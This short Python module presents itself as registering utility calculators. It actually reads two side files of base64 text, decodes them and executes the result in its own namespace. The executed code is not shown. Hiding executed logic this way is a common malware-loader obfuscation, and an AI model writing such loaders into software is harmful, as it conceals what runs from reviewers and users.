"""Force-register utility calculators (base64 parts)."""
import base64
from pathlib import Path as _P
_b64 = "".join((_P(__file__).parent / f"_fu_b64_{i}.txt").read_text() for i in range(2))
_code = base64.b64decode(_b64).decode("utf-8")
exec(compile(_code, str(_P(__file__).resolve()), "exec"), globals())
